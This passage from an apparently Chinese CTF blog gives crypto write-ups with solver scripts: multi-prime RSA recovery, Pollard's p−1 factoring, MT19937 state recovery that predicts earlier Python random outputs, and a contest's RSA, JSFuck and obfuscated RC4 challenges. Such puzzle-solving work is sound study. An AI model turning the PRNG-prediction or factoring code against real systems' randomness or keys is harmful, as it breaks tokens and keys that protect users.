class="string">7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409</span></span><br><span class="line"><span class="string">7515987842794170949444517202158067021118454558360145030399453487603693522695746732547224100845570119375977629070702308991221388721952258969752305904378724402002545947182529859604584400048983091861594720299791743887521228492714135449584003054386457751933095902983841246048952155097668245322664318518861440</span></span><br><span class="line"><span class="string">1618155233923718966393124032999431934705026408748451436388483012584983753140040289666712916510617403356206112730613485227084128314043665913357106301736817062412927135716281544348612150328867226515184078966397180771624148797528036548243343316501503364783092550480439749404301122277056732857399413805293899249313045684662146333448668209567898831091274930053147799756622844119463942087160062353526056879436998061803187343431081504474584816590199768034450005448200</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>终于来了</p>
<p>先看三个素数，这里出题人狡诈，p是用题目中的getprime函数得出来的，q和r则是用Crypto库中的getPrime得到的</p>
<p>所以看函数就知道，p+1可以很好地得到分解</p>
<p>我们求解的步奏一步步反推回去应该是这样</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706161649767.png" alt="image-20210706161649767"/>

<p>必须知道p和q，然后求出r</p>
<p>好吧，不会了，用之前看到的分解去试试</p>
<p>竟然！被同样的招式打败了。应该也是出题人使然</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706162410515.png" alt="image-20210706162410515"></p>
<p>但p确实满足上述性质</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706162852340.png" alt="image-20210706162852340"></p>
<p>那就先按照上面的流程写脚本吧</p>
<p>在最后一个箭头处，由于算来的c是512位的，所以不能对c进行直接开方；那么rabin攻击呢，模数是一个质数；终于，被老师催更无数，<strong>平方根算法</strong>登场，网上看到的一些jo本大多都是基于这个算法的实现的</p>
<blockquote>
<p>脚本编写</p>
</blockquote>
<p>emmmmm时间来不及了，先用下库函数了，后续再补充，老师等我</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_mod</span><br><span class="line"></span><br><span class="line">n = <span class="number">7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409</span></span><br><span class="line">d = <span class="number">7515987842794170949444517202158067021118454558360145030399453487603693522695746732547224100845570119375977629070702308991221388721952258969752305904378724402002545947182529859604584400048983091861594720299791743887521228492714135449584003054386457751933095902983841246048952155097668245322664318518861440</span></span><br><span class="line">cipher = <span class="number">1618155233923718966393124032999431934705026408748451436388483012584983753140040289666712916510617403356206112730613485227084128314043665913357106301736817062412927135716281544348612150328867226515184078966397180771624148797528036548243343316501503364783092550480439749404301122277056732857399413805293899249313045684662146333448668209567898831091274930053147799756622844119463942087160062353526056879436998061803187343431081504474584816590199768034450005448200</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = <span class="number">102634610559478918970860957918259981057327949366949344137104804864768237961662136189827166317524151288799657758536256924609797810164397005081733039415393</span></span><br><span class="line">q = <span class="number">7534810196420932552168708937019691994681052660068275906973480617604535381306041583841106383688654426129050931519275383386503174076258645141589911492908993</span></span><br><span class="line">r = <span class="number">10269028767754306217563721664976261924407940883784193817786660413744866184645984238866463711873380072803747092361041245422348883639933712733051005791543841</span></span><br><span class="line"><span class="keyword">assert</span> d == invert(q**<span class="number">2</span>, p**<span class="number">2</span>)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">c = <span class="built_in">pow</span>(cipher, d, n)</span><br><span class="line"><span class="comment"># print(c.bit_length())</span></span><br><span class="line"><span class="comment"># 512</span></span><br><span class="line"><span class="comment"># print(c)</span></span><br><span class="line"><span class="comment"># c = 8081092455112516397361105816900490085355315574087538340788309885334106796325593823678787887569920404814986643819898763828872716522338864714182757065213683</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(nthroot_mod(c, <span class="number">2</span>, r)))</span><br></pre></td></tr></table></figure>

<h4 id="光滑数"><a href="#光滑数" class="headerlink" title="光滑数"></a>光滑数</h4><p>之前就想整理Crypto中关于光滑数的考点</p>
<p>所谓光滑数就是：<strong>是一个可以因数分解为小素数乘积的正整数</strong></p>
<p>然后有两个算法可以分解，一是这道题讲的<a href="https://en.wikipedia.org/wiki/Williams'_p_%2B_1_algorithm">Williams’p+1 algorithm</a>，还有一种是解减一是光滑数的<a href="https://en.wikipedia.org/wiki/Pollard%27s_p_%E2%88%92_1_algorithm">Pollard’s p−1 algorithm</a>，可以使用这个python的包来解</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m primefac -vs -m=p-1 XXXXX</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m primefac -vs -m=+1 XXXXXX</span><br></pre></td></tr></table></figure>

<p>来道题</p>
<blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, sieve_base <span class="keyword">as</span> primes</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myPrime</span>(<span class="params">bits</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> n.bit_length() &lt; bits:</span><br><span class="line">            n *= choice(primes)</span><br><span class="line">        <span class="keyword">if</span> isPrime(n + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">p = myPrime(<span class="number">2048</span>)</span><br><span class="line">q = getPrime(<span class="number">2048</span>)</span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 1224542620373200232525165378018470774334801515191193204875465445916504222883935188890019876845076388385357911730689547124547346252951158814249284724565588433721828377715469374541007756509231399263095022024229078845538543233785364809917406108015271780070196140628158427541531563472532516237632553353655535922926443707617182025475004547531104052989085765070550150028833424395972178427807901747932614235844448614858629761183210600428438018388051958214596857405813088470933109693499438012040822262549119751099008671892966082341548512112435591881692782766559736840448702039918465573051130405935280702181505538733234675792472428666968900055706926735800561218167237812066851519973807203332801575980055838563085817664973968944323258406789203078387708964307931318918136664885818917720073433998810127482159223895026085726623747340692196977140382318293090736558135980651252533606603312148824142669800602887109353065489282386215179238458743567166284295855288783740314247952124965482197632971993708775190564519250754150756867653033527903848903210074426177258586450311109023467944412194124015505951966140443860862968311560843608415723549525497729679097936310538451467530605937684408079363677707513923579164067808729408365886209340192468399685190639</span></span><br><span class="line"><span class="comment"># c = 145742860621666495489510776707734134231023214235535481878205099324276369445463746101469487674333600296204530932386373415987357363515200117271393133347844479863240936801112306080456942844796779477817786176831015954410967693647534326733641573842953783193563678040093734579772976410574013857063137696465850300484753282472377882118892522844694078667622111244886303620349388556315704648609353412177123230438077637042880490566244740468503369707900343076369151796123461132932226563486870411965536062339169788331659119981901553536009275158600580698576110294775989992794065611215170351808698605911258789407992833170968332058255364527244293283228694886707241979238145252395651417561576433516407782575454294499521347378058366557950770592472271985004818847838711060048422015207674862177145761946560579360220239667890707135827136815780729363013864130107808776517514214310689477005999830284272130148939734935547341627208913181919190392205389452185597444280635342938046191904062547803917870268485346888653569349729643793041018550170090471310374856687407102762116819004790791936814214507908374380597027347007448114684844276041116955473180015221164545212550832233007714133699817366745648092776901013502840540012912660742166994968977400188176557657864</span></span><br></pre></td></tr></table></figure>

<p>显然p是n-1类型的光滑数，但是直接食用工具，效果不佳；再次确认，前面的两题是出题人有意为之</p>
<p>所以跟着CSDN大佬来看下Pollard’s p−1算法的食用方法</p>
<blockquote>
<p>推导步奏</p>
</blockquote>
<p>目标很明确，通过p分解n</p>
<p>所谓的Pollard’s p−1算法就是<br>如果p-1是光滑数，那么n!就能被p-1整除，即n!=t(p-1)<br>对于n=2,3,4,…，只要<br>$$<br>gcd(2^{n!}-1, N)\neq 1和N<br>$$<br>就成功分解N了<br>以上算法适用于p是N的因数，且p-1是光滑数</p>
<p>当然求n的阶乘是个耗费资源的事情，所以我们对递归式子精心简化，这样就不用重复计算了<br>$$<br>2^{n!}\ mod\ N=(2^{(n-1)!}\ mod\ N)^{n}\ mod\ N<br>$$</p>
<p>而由我们熟悉的费马定理可以推出<br>$$<br>2^{t(p-1)}\equiv 1\ mod\ p<br>$$<br>改写成等式<br>$$<br>2^{t(p-1)}-1=kp<br>$$<br>所以$2^{t(p-1)}-1$是p的倍数，结合前面推出的，我们得到的结论是<br>$$<br>2^{n!}-1=kp<br>$$<br><strong>通过枚举n求kp，求kp和N的公因子就是p</strong></p>
<p>也没看得特别懂，最后得到的递推式子是<br>$$<br>2^{n!}\ mod\ N=<br>\begin{cases}<br>2^2\ mod\ N&amp; {n=2}\\<br>(2^{(n-1)!}\ mod\ N)^n\ mod\ N&amp; {n \geq 3}<br>\end{cases}<br>$$</p>
<p>抄了别人这么多了，自己实现一下代码</p>
<p>感觉被套路了，还是自己算法到代码的能力太差；最后写出来的脚本是这样的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_p_1</span>(<span class="params">n</span>):</span></span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    i = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> gcd(a-<span class="number">1</span>, n) == <span class="number">1</span> <span class="keyword">or</span> gcd(a-<span class="number">1</span>, n) == n:</span><br><span class="line">        a = <span class="built_in">pow</span>(a, i, n)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">return</span> gcd(a-<span class="number">1</span>, n)</span><br></pre></td></tr></table></figure>

<p>要跑挺久的，虽然也才十几万次</p>
<p>最后得到的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Pollard_s_p-1_&amp;_William_s_p+1&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h3><blockquote>
<p> 题目描述</p>
</blockquote>
<p>Can you trace back to the past?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env/python3</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        f.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>题目名为回溯</p>
<p>妥妥的MT19937，好在之前做过；它有一千个随机数，需要找到这一千个随机数的前面一个</p>
<p>问题来了，之前GKCTF做到的，以及之前类似的题目都是预测之后的随机数，那么要反过来，预测之前的那应该怎么做呢？</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706221554229.png" alt="image-20210706221554229"></p>
<p>别急，大佬还是有解法，贴下连接这里直接抄脚本了，后续研究</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="comment"># right shift inverse</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_right</span>(<span class="params">res,shift,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits//shift):</span><br><span class="line">        tmp = res ^ tmp &gt;&gt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="comment"># right shift with mask inverse</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_right_values</span>(<span class="params">res,shift,mask,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits//shift):</span><br><span class="line">        tmp = res ^ tmp&gt;&gt;shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="comment"># left shift inverse</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_left</span>(<span class="params">res,shift,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits//shift):</span><br><span class="line">        tmp = res ^ tmp &lt;&lt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="comment"># left shift with mask inverse</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_left_values</span>(<span class="params">res,shift,mask,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits//shift):</span><br><span class="line">        tmp = res ^ tmp &lt;&lt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backtrace</span>(<span class="params">cur</span>):</span></span><br><span class="line">    high = <span class="number">0x80000000</span></span><br><span class="line">    low = <span class="number">0x7fffffff</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span></span><br><span class="line">    state = cur</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        tmp = state[i+<span class="number">624</span>]^state[i+<span class="number">397</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        <span class="comment"># recover highest bit</span></span><br><span class="line">        res = tmp&amp;high</span><br><span class="line">        <span class="comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span></span><br><span class="line">        tmp = state[i-<span class="number">1</span>+<span class="number">624</span>]^state[i+<span class="number">396</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        res |= (tmp)&amp;low</span><br><span class="line">        state[i] = res</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_state</span>(<span class="params">out</span>):</span></span><br><span class="line">    state = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> out:</span><br><span class="line">        i = inverse_right(i,<span class="number">18</span>)</span><br><span class="line">        i = inverse_left_values(i,<span class="number">15</span>,<span class="number">0xefc60000</span>)</span><br><span class="line">        i = inverse_left_values(i,<span class="number">7</span>,<span class="number">0x9d2c5680</span>)</span><br><span class="line">        i = inverse_right(i,<span class="number">11</span>)</span><br><span class="line">        state.append(i)</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;../output.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).readlines()</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    c.append(<span class="built_in">int</span>(f[i].strip()))</span><br><span class="line"></span><br><span class="line">partS = recover_state(c)</span><br><span class="line">state = backtrace([<span class="number">0</span>]*<span class="number">4</span>+partS)[:<span class="number">624</span>]</span><br><span class="line"><span class="comment"># print(state)</span></span><br><span class="line">prng = Random()</span><br><span class="line">prng.setstate((<span class="number">3</span>,<span class="built_in">tuple</span>(state+[<span class="number">0</span>]),<span class="literal">None</span>))</span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(prng.getrandbits(<span class="number">32</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<hr>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706221821180.png" alt="image-20210706221821180"></p>
<p>你说说你还有什么用，只会抄WP</p>
<p>花了两天，算是过了一遍，但是越到后面，研究的劲头就越低，很多资料还是要消化成自己的东西</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>光滑数</tag>
      </tags>
  </entry>
  <entry>
    <title>20210523 宁波市第四届网络安全大赛Crypto方向WP</title>
    <url>/posts/a428a61f/</url>
    <content><![CDATA[<p>emmmmm前三届是怎么办起来的</p>
<span id="more"></span>

<h1 id="2021宁波市第四届网络安全大赛"><a href="#2021宁波市第四届网络安全大赛" class="headerlink" title="2021宁波市第四届网络安全大赛"></a>2021宁波市第四届网络安全大赛</h1><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>开始还以为题目错了，出题人还是很严谨的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">黑板上写着一道题：</span><br><span class="line">p=6FBC2F9E39</span><br><span class="line">q=44CF33</span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">求d？</span><br><span class="line">答案就是flag</span><br></pre></td></tr></table></figure>

<p>其实这些都是16进制的，然后求出来的d也要转换成16进制的大写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">p = <span class="number">0x6FBC2F9E39</span></span><br><span class="line">q = <span class="number">0x44CF33</span></span><br><span class="line">e = <span class="number">0x17</span></span><br><span class="line">d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="comment"># print(hex(d).upper())</span></span><br><span class="line">m = hashlib.md5(<span class="built_in">hex</span>(d).upper()[<span class="number">2</span>:].encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(m.upper())</span><br></pre></td></tr></table></figure>

<p>出来是这样</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">479A4D532737AC1EC3640F85E375B659</span><br></pre></td></tr></table></figure>

<p>包上flag{}就好</p>
<h3 id="简单编码"><a href="#简单编码" class="headerlink" title="简单编码"></a>简单编码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure>

<p>jsFuck丢进浏览器console里输出一下，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">119178353342323</span><br></pre></td></tr></table></figure>

<p>直接转还错了，瞎猜样地转了下bytes，竟然没有乱码，绝逼是它了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">t = <span class="number">119178353342323</span></span><br><span class="line"><span class="comment"># t = long_to_bytes(t)</span></span><br><span class="line">m = hashlib.md5(<span class="string">&#x27;ld_jws&#x27;</span>.encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(m.upper())</span><br></pre></td></tr></table></figure>

<p>最终得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;1E8FB0BC2025429CC885D2F794A89EB8&#125;</span><br></pre></td></tr></table></figure>

<h3 id="nike"><a href="#nike" class="headerlink" title="nike"></a>nike</h3><p>恶心，抄别人题目<a href="https://blog.csdn.net/qq_41252520/article/details/101227790">原题</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> __operator, __<span class="built_in">print</span>, __g, __y: [(sys.setrecursionlimit(<span class="number">1000000</span>), [[[[[(decode(cipher), <span class="literal">None</span>)[<span class="number">1</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;cipher&#x27;</span>] <span class="keyword">in</span> [(<span class="string">&#x27;D6VNEIRAryZ8Opdbl3bOwqmBD+lmFXbcd/XfgHalqYBh1FDtbJo=&#x27;</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;decode&#x27;</span>], decode.__name__ <span class="keyword">in</span> [(<span class="keyword">lambda</span> cipher: (<span class="keyword">lambda</span> __l: [(init(), [[[(<span class="keyword">lambda</span> __after: (__<span class="built_in">print</span>(<span class="string">&#x27;sorry,you dont have the auth&#x27;</span>), <span class="number">0</span>)[<span class="number">1</span>] <span class="keyword">if</span> (__l[<span class="string">&#x27;auth&#x27;</span>] == <span class="number">1</span>) <span class="keyword">else</span> __after())(<span class="keyword">lambda</span>: (<span class="keyword">lambda</span> __items, __after, __sentinel: __y(<span class="keyword">lambda</span> __this: <span class="keyword">lambda</span>: (<span class="keyword">lambda</span> __i: [[__this() <span class="keyword">for</span> __l[<span class="string">&#x27;result&#x27;</span>] <span class="keyword">in</span> [(__operator.iadd(__l[<span class="string">&#x27;result&#x27;</span>], <span class="built_in">chr</span>((s[(__l[<span class="string">&#x27;i&#x27;</span>] % <span class="number">256</span>)] ^ <span class="built_in">ord</span>(__l[<span class="string">&#x27;cipher&#x27;</span>][__l[<span class="string">&#x27;i&#x27;</span>]])))))]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;i&#x27;</span>] <span class="keyword">in</span> [(__i)]][<span class="number">0</span>] <span class="keyword">if</span> __i <span class="keyword">is</span> <span class="keyword">not</span> __sentinel <span class="keyword">else</span> __after())(<span class="built_in">next</span>(__items, __sentinel)))())(<span class="built_in">iter</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(__l[<span class="string">&#x27;cipher&#x27;</span>]))), <span class="keyword">lambda</span>: (__<span class="built_in">print</span>(__l[<span class="string">&#x27;result&#x27;</span>].encode(<span class="string">&#x27;base64&#x27;</span>)), <span class="literal">None</span>)[<span class="number">1</span>], [])) <span class="keyword">for</span> __l[<span class="string">&#x27;auth&#x27;</span>] <span class="keyword">in</span> [(<span class="number">0</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;cipher&#x27;</span>] <span class="keyword">in</span> [(__l[<span class="string">&#x27;cipher&#x27;</span>].decode(<span class="string">&#x27;base64&#x27;</span>))]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;result&#x27;</span>] <span class="keyword">in</span> [(<span class="string">&#x27;&#x27;</span>)]][<span class="number">0</span>])[<span class="number">1</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;cipher&#x27;</span>] <span class="keyword">in</span> [(cipher)]][<span class="number">0</span>])(&#123;&#125;), <span class="string">&#x27;decode&#x27;</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;init&#x27;</span>], init.__name__ <span class="keyword">in</span> [(<span class="keyword">lambda</span> : (<span class="keyword">lambda</span> __l: [[(<span class="keyword">lambda</span> __items, __after, __sentinel: __y(<span class="keyword">lambda</span> __this: <span class="keyword">lambda</span>: (<span class="keyword">lambda</span> __i: [(s.append(__l[<span class="string">&#x27;i&#x27;</span>]), (k.append(<span class="built_in">ord</span>(__l[<span class="string">&#x27;key&#x27;</span>][(__l[<span class="string">&#x27;i&#x27;</span>] % <span class="built_in">len</span>(__l[<span class="string">&#x27;key&#x27;</span>]))])), __this())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;i&#x27;</span>] <span class="keyword">in</span> [(__i)]][<span class="number">0</span>] <span class="keyword">if</span> __i <span class="keyword">is</span> <span class="keyword">not</span> __sentinel <span class="keyword">else</span> __after())(<span class="built_in">next</span>(__items, __sentinel)))())(<span class="built_in">iter</span>(<span class="built_in">range</span>(<span class="number">256</span>)), <span class="keyword">lambda</span>: (<span class="keyword">lambda</span> __items, __after, __sentinel: __y(<span class="keyword">lambda</span> __this: <span class="keyword">lambda</span>: (<span class="keyword">lambda</span> __i: [[[[[__this() <span class="keyword">for</span> s[__l[<span class="string">&#x27;j&#x27;</span>]] <span class="keyword">in</span> [(__l[<span class="string">&#x27;tmp&#x27;</span>])]][<span class="number">0</span>] <span class="keyword">for</span> s[__l[<span class="string">&#x27;i&#x27;</span>]] <span class="keyword">in</span> [(s[__l[<span class="string">&#x27;j&#x27;</span>]])]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;tmp&#x27;</span>] <span class="keyword">in</span> [(s[__l[<span class="string">&#x27;i&#x27;</span>]])]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;j&#x27;</span>] <span class="keyword">in</span> [((((__l[<span class="string">&#x27;j&#x27;</span>] + s[__l[<span class="string">&#x27;i&#x27;</span>]]) + k[__l[<span class="string">&#x27;i&#x27;</span>]]) % <span class="number">256</span>))]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;i&#x27;</span>] <span class="keyword">in</span> [(__i)]][<span class="number">0</span>] <span class="keyword">if</span> __i <span class="keyword">is</span> <span class="keyword">not</span> __sentinel <span class="keyword">else</span> __after())(<span class="built_in">next</span>(__items, __sentinel)))())(<span class="built_in">iter</span>(<span class="built_in">range</span>(<span class="number">256</span>)), <span class="keyword">lambda</span>: <span class="literal">None</span>, []), []) <span class="keyword">for</span> __l[<span class="string">&#x27;j&#x27;</span>] <span class="keyword">in</span> [(<span class="number">0</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;key&#x27;</span>] <span class="keyword">in</span> [(<span class="string">&#x27;aV9hbV9ub3RfZmxhZw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))]][<span class="number">0</span>])(&#123;&#125;), <span class="string">&#x27;init&#x27;</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;k&#x27;</span>] <span class="keyword">in</span> [([])]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;s&#x27;</span>] <span class="keyword">in</span> [([])]][<span class="number">0</span>])[<span class="number">1</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;sys&#x27;</span>] <span class="keyword">in</span> [(<span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>, __g, __g))]][<span class="number">0</span>])(<span class="built_in">__import__</span>(<span class="string">&#x27;operator&#x27;</span>, level=<span class="number">0</span>), <span class="built_in">__import__</span>(<span class="string">&#x27;__builtin__&#x27;</span>, level=<span class="number">0</span>).__dict__[<span class="string">&#x27;print&#x27;</span>], <span class="built_in">globals</span>(), (<span class="keyword">lambda</span> f: (<span class="keyword">lambda</span> x: x(x))(<span class="keyword">lambda</span> y: f(<span class="keyword">lambda</span>: y(y)()))))</span><br></pre></td></tr></table></figure>

<p>写在一行了</p>
<p>按照原题的改就好，虽然不知道为什么有红线报错还是能运行</p>
<p>出来一个base64转一下，得到</p>
